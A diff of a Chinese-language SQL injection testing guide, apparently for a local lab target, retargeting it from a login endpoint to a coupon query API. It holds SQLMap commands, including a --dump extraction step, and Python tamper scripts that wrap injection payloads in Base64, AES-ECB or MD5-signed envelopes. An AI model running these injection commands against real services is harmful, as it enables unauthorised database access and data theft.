@@ -10,12 +10,11 @@
 // 前端代码
 const data = {
     req_id: generateId(),
-    content: btoa(JSON.stringify({
-        username: userInput,
-        password: passInput
+    data: btoa(JSON.stringify({
+        coupon_code: userInput
     }))
 };
-fetch('/api/login', {
+fetch('/api/coupon/query', {
     method: 'POST',
     body: JSON.stringify(data)
 });
@@ -23,17 +22,17 @@ fetch('/api/login', {
 
 ### 测试方法
 1. 使用浏览器开发者工具拦截请求
-2. 复制 content 字段值
+2. 复制 data 字段值
 3. Base64 解码查看内部结构
 4. 构造注入 payload 并重新编码
 5. 使用 SQLMap + tamper 脚本自动化测试
 
 ### SQLMap 命令
 ```bash
-python sqlmap.py -u "http://target.com/api/login" \
-  --data='{"req_id":"1","content":"test"}' \
-  --tamper=base64_nested \
-  -p content --batch
+python sqlmap.py -u "http://127.0.0.1:9527/api/coupon/query" \
+  --data='{"req_id":"1","data":"test"}' \
+  --tamper=tamper_script \
+  -p data --batch
 ```
 
 ---
@@ -70,14 +69,14 @@ import base64
 def tamper(payload, **kwargs):
     key = b'your-secret-key-'
     cipher = AES.new(key, AES.MODE_ECB)
-    
-    inner_data = {"param": payload}
+
+    inner_data = {"coupon_code": payload}
     inner_json = json.dumps(inner_data)
-    
+
     # 填充
     pad_len = 16 - len(inner_json) % 16
     padded = inner_json + chr(pad_len) * pad_len
-    
+
     # 加密
     encrypted = cipher.encrypt(padded.encode())
     return base64.b64encode(encrypted).decode()
@@ -213,14 +212,14 @@ import json
 
 def tamper(payload, **kwargs):
     secret = "secret_key"
-    
+
     # 构建数据
-    inner = {"query": payload}
+    inner = {"coupon_code": payload}
     data = base64.b64encode(json.dumps(inner).encode()).decode()
-    
+
     # 计算签名
     sign = hashlib.md5((data + secret).encode()).hexdigest()
-    
+
     # 返回完整请求体（需要在 --eval 中处理）
     return json.dumps({"data": data, "sign": sign})
 ```
@@ -253,10 +252,10 @@ def tamper(payload, **kwargs):
 4. **SQLMap 自动化测试**
    ```bash
    # 基础检测
-   python sqlmap.py -u URL --data='...' --tamper=script -p param --batch
-   
+   python sqlmap.py -u URL --data='{"req_id":"1","data":"test"}' --tamper=tamper_script -p data --batch
+
    # 提取数据
-   python sqlmap.py -u URL --data='...' --tamper=script -p param --batch --dump
+   python sqlmap.py -u URL --data='{"req_id":"1","data":"test"}' --tamper=tamper_script -p data --batch --dump
    ```
 
 5. **结果验证**
